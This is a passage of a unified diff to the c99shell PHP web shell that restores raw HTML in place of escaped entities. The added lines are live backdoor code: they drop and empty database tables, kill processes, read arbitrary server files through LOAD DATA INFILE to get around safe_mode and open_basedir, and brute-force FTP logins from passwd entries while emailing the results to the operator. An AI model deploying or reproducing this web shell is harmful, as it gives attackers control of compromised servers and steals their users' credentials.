-       echo "&lt;a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"&gt;&lt;img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;&nbsp;";
-       echo "&lt;/td&gt;";
-       echo "&lt;/tr&gt;";
+       echo "<td>";
+       echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
+       echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
+       echo "</td>";
+       echo "</tr>";
       }
       mysql_free_result($result);
-      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"left\"&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;&lt;select name=\"sql_act\"&gt;";
-      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
-      echo "&lt;option value=\"deleterow\"&gt;Delete&lt;/option&gt;";
-      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
+      echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
+      echo "<option value=\"\">With selected:</option>";
+      echo "<option value=\"deleterow\">Delete</option>";
+      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
      }
     }
     else
@@ -1593,7 +1593,7 @@ else
      if (!$result) {echo mysql_smarterror();}
      else
      {
-      echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Table&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Rows&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Created&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Modified&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
+      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
       $i = 0;
       $tsize = $trows = 0;
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
@@ -1601,38 +1601,38 @@ else
        $tsize += $row["Data_length"];
        $trows += $row["Rows"];
        $size = view_size($row["Data_length"]);
-       echo "&lt;tr&gt;";
-       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"&gt;&lt;/td&gt;";
-       echo "&lt;td&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"&gt;&lt;b&gt;".$row["Name"]."&lt;/b&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
-       echo "&lt;td&gt;".$row["Rows"]."&lt;/td&gt;";
-       echo "&lt;td&gt;".$row["Type"]."&lt;/td&gt;";
-       echo "&lt;td&gt;".$row["Create_time"]."&lt;/td&gt;";
-       echo "&lt;td&gt;".$row["Update_time"]."&lt;/td&gt;";
-       echo "&lt;td&gt;".$size."&lt;/td&gt;";
-       echo "&lt;td&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&nbsp;&lt;a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
-       echo "&lt;/tr&gt;";
+       echo "<tr>";
+       echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";
+       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>";
+       echo "<td>".$row["Rows"]."</td>";
+       echo "<td>".$row["Type"]."</td>";
+       echo "<td>".$row["Create_time"]."</td>";
+       echo "<td>".$row["Update_time"]."</td>";
+       echo "<td>".$size."</td>";
+       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";
+       echo "</tr>";
        $i++;
       }
-      echo "&lt;tr bgcolor=\"000000\"&gt;";
-      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;+&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
-      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;".$i." table(s)&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
-      echo "&lt;td&gt;&lt;b&gt;".$trows."&lt;/b&gt;&lt;/td&gt;";
-      echo "&lt;td&gt;".$row[1]."&lt;/td&gt;";
-      echo "&lt;td&gt;".$row[10]."&lt;/td&gt;";
-      echo "&lt;td&gt;".$row[11]."&lt;/td&gt;";
-      echo "&lt;td&gt;&lt;b&gt;".view_size($tsize)."&lt;/b&gt;&lt;/td&gt;";
-      echo "&lt;td&gt;&lt;/td&gt;";
-      echo "&lt;/tr&gt;";
-      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"right\"&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;&lt;select name=\"sql_act\"&gt;";
-      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
-      echo "&lt;option value=\"tbldrop\"&gt;Drop&lt;/option&gt;";
-      echo "&lt;option value=\"tblempty\"&gt;Empty&lt;/option&gt;";
-      echo "&lt;option value=\"tbldump\"&gt;Dump&lt;/option&gt;";
-      echo "&lt;option value=\"tblcheck\"&gt;Check table&lt;/option&gt;";
-      echo "&lt;option value=\"tbloptimize\"&gt;Optimize table&lt;/option&gt;";
-      echo "&lt;option value=\"tblrepair\"&gt;Repair table&lt;/option&gt;";
-      echo "&lt;option value=\"tblanalyze\"&gt;Analyze table&lt;/option&gt;";
-      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
+      echo "<tr bgcolor=\"000000\">";
+      echo "<td><center><b>+</b></center></td>";
+      echo "<td><center><b>".$i." table(s)</b></center></td>";
+      echo "<td><b>".$trows."</b></td>";
+      echo "<td>".$row[1]."</td>";
+      echo "<td>".$row[10]."</td>";
+      echo "<td>".$row[11]."</td>";
+      echo "<td><b>".view_size($tsize)."</b></td>";
+      echo "<td></td>";
+      echo "</tr>";
+      echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";
+      echo "<option value=\"\">With selected:</option>";
+      echo "<option value=\"tbldrop\">Drop</option>";
+      echo "<option value=\"tblempty\">Empty</option>";
+      echo "<option value=\"tbldump\">Dump</option>";
+      echo "<option value=\"tblcheck\">Check table</option>";
+      echo "<option value=\"tbloptimize\">Optimize table</option>";
+      echo "<option value=\"tblrepair\">Repair table</option>";
+      echo "<option value=\"tblanalyze\">Analyze table</option>";
+      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
       mysql_free_result($result);
      }
     }
@@ -1642,42 +1642,42 @@ else
   else
   {
    $acts = array("","newdb","serverstatus","servervars","processes","getfile");
-   if (in_array($sql_act,$acts)) {?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php }
+   if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }
    if (!empty($sql_act))
    {
-    echo "&lt;hr size=\"1\" noshade&gt;";
+    echo "<hr size=\"1\" noshade>";
     if ($sql_act == "newdb")
     {
-     echo "&lt;b&gt;";
-     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";}
-     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
+     echo "<b>";
+     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
+     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
     }
     if ($sql_act == "serverstatus")
     {
      $result = mysql_query("SHOW STATUS", $sql_sock);
-     echo "&lt;center&gt;&lt;b&gt;Server-status variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
-     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
-     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";}
-     echo "&lt;/table&gt;&lt;/center&gt;";
+     echo "<center><b>Server-status variables:</b><br><br>";
+     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
+     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
+     echo "</table></center>";
      mysql_free_result($result);
     }
     if ($sql_act == "servervars")
     {
      $result = mysql_query("SHOW VARIABLES", $sql_sock);
-     echo "&lt;center&gt;&lt;b&gt;Server variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
-     echo "&lt;TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
-     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;/tr&gt;";}
-     echo "&lt;/table&gt;";
+     echo "<center><b>Server variables:</b><br><br>";
+     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
+     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
+     echo "</table>";
      mysql_free_result($result);
     }
     if ($sql_act == "processes")
     {
-     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "&lt;b&gt;Killing process #".$kill."... ok. he is dead, amen.&lt;/b&gt;";}
+     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}
      $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
-     echo "&lt;center&gt;&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
-     echo "&lt;TABLE cellSpacing=0 cellPadding=2 bgcolor=#000000 borderColorLight=#333333 border=1&gt;&lt;td&gt;&lt;b&gt;ID&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;USER&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;HOST&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;DB&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;COMMAND&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;TIME&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;STATE&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;INFO&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
-     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "&lt;tr&gt;&lt;td&gt;".$row[0]."&lt;/td&gt;&lt;td&gt;".$row[1]."&lt;/td&gt;&lt;td&gt;".$row[2]."&lt;/td&gt;&lt;td&gt;".$row[3]."&lt;/td&gt;&lt;td&gt;".$row[4]."&lt;/td&gt;&lt;td&gt;".$row[5]."&lt;/td&gt;&lt;td&gt;".$row[6]."&lt;/td&gt;&lt;td&gt;".$row[7]."&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"&gt;&lt;u&gt;Kill&lt;/u&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";}
-     echo "&lt;/table&gt;";
+     echo "<center><b>Processes:</b><br><br>";
+     echo "<TABLE cellSpacing=0 cellPadding=2 bgcolor=#000000 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
+     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}
+     echo "</table>";
      mysql_free_result($result);
     }
     if ($sql_act == "getfile")
@@ -1691,14 +1691,14 @@ else
       mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
       mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
       $result = mysql_query("SELECT * FROM tmp_file;");
-      if (!$result) {echo "&lt;b&gt;Error in reading file (permision denied)!&lt;/b&gt;";}
+      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
       else
       {
-       for ($i=0;$i&lt;mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
+       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
        $f = "";
        while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
-       if (empty($f)) {echo "&lt;b&gt;File \"".$sql_getfile."\" does not exists or empty!&lt;/b&gt;&lt;br&gt;";}
-       else {echo "&lt;b&gt;File \"".$sql_getfile."\":&lt;/b&gt;&lt;br&gt;".nl2br(htmlspecialchars($f))."&lt;br&gt;";}
+       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
+       else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
        mysql_free_result($result);
        mysql_query("DROP TABLE tmp_file;");
       }
@@ -1708,29 +1708,29 @@ else
    }
   }
 }
-echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "</td></tr></table>";
 if ($sql_sock)
 {
   $affected = @mysql_affected_rows($sql_sock);
-  if ((!is_numeric($affected)) or ($affected &lt; 0)){$affected = 0;}
-  echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Affected rows: ".$affected."&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;";
+  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
+  echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>";
 }
-echo "&lt;/table&gt;";
+echo "</table>";
 }
 if ($act == "mkdir")
 {
 if ($mkdir != $d)
 {
-  if (file_exists($mkdir)) {echo "&lt;b&gt;Make Dir \"".htmlspecialchars($mkdir)."\"&lt;/b&gt;: object alredy exists";}
-  elseif (!mkdir($mkdir)) {echo "&lt;b&gt;Make Dir \"".htmlspecialchars($mkdir)."\"&lt;/b&gt;: access denied";}
-  echo "&lt;br&gt;&lt;br&gt;";
+  if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";}
+  elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}
+  echo "<br><br>";
 }
 $act = $dspact = "ls";
 }
 if ($act == "ftpquickbrute")
 {
-echo "&lt;b&gt;Ftp Quick brute:&lt;/b&gt;&lt;br&gt;";
-if (!win) {echo "This functions not work in Windows!&lt;br&gt;&lt;br&gt;";}
+echo "<b>Ftp Quick brute:</b><br>";
+if (!win) {echo "This functions not work in Windows!<br><br>";}
 else
 {
   function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
@@ -1742,7 +1742,7 @@ else
     $sock = @ftp_connect($host,$port,$timeout);
     if (@ftp_login($sock,$login,$pass))
     {
-     echo "&lt;a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"&gt;&lt;b&gt;Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"&lt;/b&gt;&lt;/a&gt;.&lt;br&gt;";
+     echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
      ob_flush();
      return TRUE;
     }
@@ -1770,18 +1770,18 @@ else
      $str = explode(":",fgets($fp,2048));
      if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
      {
-      echo "&lt;b&gt;Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"&lt;/b&gt;&lt;br&gt;";
+      echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>";
       $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
       if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
       $success++;
       ob_flush();
      }
-     if ($i &gt; $fqb_lenght) {break;}
+     if ($i > $fqb_lenght) {break;}
      $i++;
     }
     if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
     $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
-    echo "&lt;hr size=\"1\" noshade&gt;&lt;b&gt;Done!&lt;/b&gt;&lt;br&gt;Total time (secs.): ".$ftpquick_t."&lt;br&gt;Total connections: ".$i."&lt;br&gt;Success.: &lt;font color=green&gt;&lt;b&gt;".$success."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;Unsuccess.:".($i-$success)."&lt;/b&gt;&lt;br&gt;Connects per second: ".round($i/$ftpquick_t,2)."&lt;br&gt;";
+    echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
     $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
     if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
     if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
@@ -1792,67 +1792,67 @@ else
   {
    $logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
    $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
-   echo "&lt;form action=\"".$surl."\"&gt;&lt;input type=hidden name=act value=\"ftpquickbrute\"&gt;&lt;br&gt;Read first: &lt;input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"&gt;&lt;br&gt;&lt;br&gt;Users only with shell?&nbsp;&lt;input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"&gt;&lt;br&gt;&lt;br&gt;Logging?&nbsp;&lt;input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked&gt;&lt;br&gt;Logging to file?&nbsp;&lt;input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"&gt;&lt;br&gt;Logging to e-mail?&nbsp;&lt;input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Brute\"&gt;&lt;/form&gt;";
+   echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"ftpquickbrute\"><br>Read first: <input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br>Logging?&nbsp;<input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked><br>Logging to file?&nbsp;<input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"><br>Logging to e-mail?&nbsp;<input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"><br><br><input type=submit name=submit value=\"Brute\"></form>";
   }
 }
 }
 if ($act == "d")
 {
-if (!is_dir($d)) {echo "&lt;center&gt;&lt;b&gt;Permision denied!&lt;/b&gt;&lt;/center&gt;";}
+if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}
 else
 {
-  echo "&lt;b&gt;Directory information:&lt;/b&gt;&lt;table border=0 cellspacing=1 cellpadding=2&gt;";
+  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
   if (!$win)
   {
-   echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ";
+   echo "<tr><td><b>Owner/Group</b></td><td> ";
    $ow = posix_getpwuid(fileowner($d));
    $gr = posix_getgrgid(filegroup($d));
    $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
   }
-  echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=\"".$surl."act=chmod&d=".urlencode($d)."\"&gt;&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;&lt;/a&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Create time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filectime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Access time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",fileatime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;MODIFY time&lt;/b&gt;&lt;/td&gt;&lt;td&gt; ".date("d/m/Y H:i:s",filemtime($d))."&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
+  echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";
 }
 }
 if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
 if ($act == "security")
 {
